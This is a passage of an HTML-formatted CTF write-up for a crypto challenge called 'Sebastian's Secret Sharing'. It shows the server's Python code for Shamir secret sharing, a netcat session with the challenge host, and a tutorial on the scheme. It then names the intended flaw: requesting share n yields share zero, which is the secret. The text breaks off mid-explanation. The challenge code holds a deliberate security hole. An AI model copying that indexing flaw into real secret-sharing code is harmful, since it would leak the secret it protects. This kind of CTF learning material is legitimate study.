&lt;&#x2F;span&gt;&lt;span&gt;			px &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;([&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;a[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t)]) 
&lt;&#x2F;span&gt;&lt;span&gt;			s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;((x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;px))
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;s
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;shares&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(shares)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t
&lt;&#x2F;span&gt;&lt;span&gt;		secret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t):
&lt;&#x2F;span&gt;&lt;span&gt;			yj &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(shares[j][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;			r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t):
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;j:
&lt;&#x2F;span&gt;&lt;span&gt;					&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;continue
&lt;&#x2F;span&gt;&lt;span&gt;				xm &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(shares[m][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;				xj &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(shares[j][&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;				r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(xm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(xm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;xj))
&lt;&#x2F;span&gt;&lt;span&gt;			secret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(yj &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;r)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;round&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(secret)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;l)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getcontext&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;prec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;256 &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# beat devision with precision :D 
&lt;&#x2F;span&gt;&lt;span&gt;	n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;150&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	sss &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SeSeSe&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;r&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;t)
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	shares &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Welcome to Sebastian&amp;#39;s Secret Sharing!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;I have split my secret into 1..N=&lt;&#x2F;span&gt;&lt;span&gt;{sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; shares, and you need t=&lt;&#x2F;span&gt;&lt;span&gt;{sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; shares to recover it.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;However, I will only give you &lt;&#x2F;span&gt;&lt;span&gt;{sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; shares :P&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;			sid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;{i}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;.: Choose a share: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;sid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n:
&lt;&#x2F;span&gt;&lt;span&gt;				&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(shares[sid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;sss&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n])
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;pass
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Good luck!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The remote connection of chalenge gives us the following information.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt; nc 52.59.124.14 10031
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Welcome&lt;&#x2F;span&gt;&lt;span&gt; to Sebastian&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;s Secret Sharing!
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;I have split my secret into 1..N=83 shares, and you need t=10 shares to recover it.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;However, I will only give you 9 shares :P
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;1.: Choose a share: 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I searched about secret sharing schemes available, and found that this challenge is related to &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Shamir%27s_secret_sharing&quot; target=_blank&gt;Shamir Secret Sharing&lt;&#x2F;a&gt;. I used trailofbits &lt;a href=&quot;https:&#x2F;&#x2F;www.zkdocs.com&#x2F;docs&#x2F;zkdocs&#x2F;protocol-primitives&#x2F;shamir&#x2F;&quot; target=_blank&gt;ZKdocs&lt;&#x2F;a&gt;to learn weaknesses in Shamir Secret Sharing.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;shamir-secret-sharing&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#shamir-secret-sharing&quot; aria-label=&quot;Anchor link for: shamir-secret-sharing&quot;&gt;Shamir Secret Sharing&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Shamir&#x27;s Secret Sharing is a cryptographic algorithm that allows you to split a secret into multiple shares in such a way that a minimum threshold of these shares is required to reconstruct the original secret. The algorithm was developed by Adi Shamir in 1979.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;step-1-choose-a-prime-number-and-parameters&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#step-1-choose-a-prime-number-and-parameters&quot; aria-label=&quot;Anchor link for: step-1-choose-a-prime-number-and-parameters&quot;&gt;Step 1: Choose a Prime Number and Parameters&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;ol&gt;
&lt;li&gt;Choose a large prime number $$p$$ such that $$p &amp;gt; \text{max_secret_value}$$, where $$\text{max_secret_value}$$ is the maximum possible value of the secret you want to share.&lt;&#x2F;li&gt;
&lt;li&gt;Choose a threshold value $$ (k) $$, which represents the minimum number of shares required to reconstruct the secret.&lt;&#x2F;li&gt;
&lt;li&gt;Choose $$(k-1)$$ random coefficients $$(a_1, a_2, \ldots, a_{k-1})$$ from the finite field $$(\mathbb{F}_p)$$.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h4 id=&quot;step-2-define-the-polynomial&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#step-2-define-the-polynomial&quot; aria-label=&quot;Anchor link for: step-2-define-the-polynomial&quot;&gt;Step 2: Define the Polynomial&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;
&lt;p&gt;Construct a polynomial of degree $$(k-1)$$ over $$(\mathbb{F}_p)$$ using the chosen coefficients:&lt;&#x2F;p&gt;
&lt;p&gt;$$
f(x) = a_1x^{k-1} + a_2x^{k-2} + \ldots + a_{k-1}x + \text{secret}\
$$&lt;&#x2F;p&gt;
&lt;p&gt;Where:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;$$(a_1, a_2, \ldots, a_{k-1})$$ are the randomly chosen coefficients.&lt;&#x2F;li&gt;
&lt;li&gt;$$(\text{secret})$$ is the value you want to share.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h4 id=&quot;step-3-generate-shares&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#step-3-generate-shares&quot; aria-label=&quot;Anchor link for: step-3-generate-shares&quot;&gt;Step 3: Generate Shares&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;
&lt;p&gt;Choose $$(k)$$ distinct x-values $$(x_1, x_2, \ldots, x_k)$$ from the field $$(\mathbb{F}_p)$$.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Compute $$(y_i = f(x_i))$$ for each $$(i)$$, which represents the shares:&lt;&#x2F;p&gt;
&lt;p&gt;$$
y_i = a_1x_i^{k-1} + a_2x_i^{k-2} + \ldots + a_{k-1}x_i + \text{secret}
$$&lt;&#x2F;p&gt;
&lt;p&gt;These $$k$$ pairs $$((x_i, y_i))$$ are the shares that can be distributed among participants.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h4 id=&quot;step-4-share-distribution&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#step-4-share-distribution&quot; aria-label=&quot;Anchor link for: step-4-share-distribution&quot;&gt;Step 4: Share Distribution&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;ol start=&quot;7&quot;&gt;
&lt;li&gt;Distribute the shares $$((x_i, y_i))$$ to the participants. Each participant receives one share.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h4 id=&quot;step-5-secret-reconstruction&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#step-5-secret-reconstruction&quot; aria-label=&quot;Anchor link for: step-5-secret-reconstruction&quot;&gt;Step 5: Secret Reconstruction&lt;&#x2F;a&gt;&lt;&#x2F;h4&gt;
&lt;ol start=&quot;8&quot;&gt;
&lt;li&gt;
&lt;p&gt;To reconstruct the secret, you need at least $$(k)$$ shares. Let&#x27;s say you have $$(k)$$ shares $$((x_1, y_1), (x_2, y_2), \ldots, (x_k, y_k))$$&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Use Lagrange interpolation to find the value of the secret:&lt;&#x2F;p&gt;
&lt;p&gt;$$
\text{secret} = \sum_{i=1}^{k} y_i \cdot \frac{\prod_{j=1, j\neq i}^{k} (x - x_j)}{\prod_{j=1, j\neq i}^{k} (x_i - x_j)}
$$&lt;&#x2F;p&gt;
&lt;p&gt;Where:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;$$(y_i)$$ are the y-values of the shares.&lt;&#x2F;li&gt;
&lt;li&gt;$$(x_i)$$ are the x-values of the shares.&lt;&#x2F;li&gt;
&lt;li&gt;$$(x)$$ is the variable (typically set to 0).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;By calculating this equation, you can reconstruct the original secret.&lt;&#x2F;p&gt;
&lt;p&gt;This is how &lt;code&gt;Shamir Secret Sharing&lt;&#x2F;code&gt; cryptosystem works. Coming to Challenge, we are able to get the $$(k-1)$$ shares of secret, but we need exactly $$k$$ shares to reconstruct the secret. The secret is nothing but the $$0^{th}$$ share ((0,S_0)).&lt;&#x2F;p&gt;
&lt;p&gt;I was not able to find the flaw in system during the CTF, after the CTF &lt;strong&gt;&lt;code&gt;hakid29&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; on discord helped me to find the flaw, that is, sending &lt;code&gt;n&lt;&#x2F;code&gt; will give us the $$0^{th}$$ share which is the actual secret.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Why sending n..?&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If we observer the following line in code,&lt;&#x2F;p&gt;
